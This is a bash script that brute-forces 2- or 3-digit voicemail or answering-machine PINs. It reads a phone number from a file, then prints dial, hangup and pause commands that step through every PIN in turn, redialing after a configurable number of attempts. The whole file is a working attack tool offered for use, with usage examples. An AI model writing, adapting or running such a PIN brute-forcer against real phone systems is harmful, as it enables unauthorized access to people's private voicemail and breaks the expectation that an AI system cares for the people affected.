#!/usr/bin/env bash

if (( $# < 1 )); then
	printf "Usage: %s <file_with_number_to_dial> [number of digits in pin] [redial after number of attempts]\n" "$0"
	printf "Example: %s 0306061361.txt 3 5\n" "$0"
	printf "Example: %s 0306061361.txt\n" "$0"
	printf "Default is %s <file_with_number_to_dial> 2 3\n\n" "$0"
	exit 1
fi

#Change timeouts accordingly to your requirement
dial_string="D\t%s\t100\t100\n"
#if no eol is rquired change to""
eol_string="D\t#\t100\t100\n"

# Default to 2 digits unless explicitly 3

digits=2
max=99
attempts=3

# Parse arguments

#read dial file with the phone number to dial
if [[ -f $1 ]]; then
    dial=$(cat "$1")
else
    echo "Error: $1 not found!" >&2
    exit 1
fi

# check whether to use 2 or 3 digit brute force
if (( $2 == 3 )); then
    digits=3
    max=999
fi

# get the number of attempts before redial is required
if (( $# == 3 )); then
  attempts=$3
fi

#Brute force all combo's
for ((i=0; i<=max; i++)); do
    # Every 3rd iteration
    if (( i  % attempts == 0 )); then
        echo -e "H\t1000"
        echo "$dial"
    fi

    # Format number with leading zeros
    if (( digits == 2 )); then
        a=$(printf "%02d" "$i")
    else
        a=$(printf "%03d" "$i")
    fi

    # Loop through each digit
    for ((j=0; j<digits; j++)); do
        char="${a:j:1}"
        printf "$dial_string" "$char"
    done
    # Some answering machines require # as eol
    printf "$eol_string"
    printf "~\t1000\n"
done
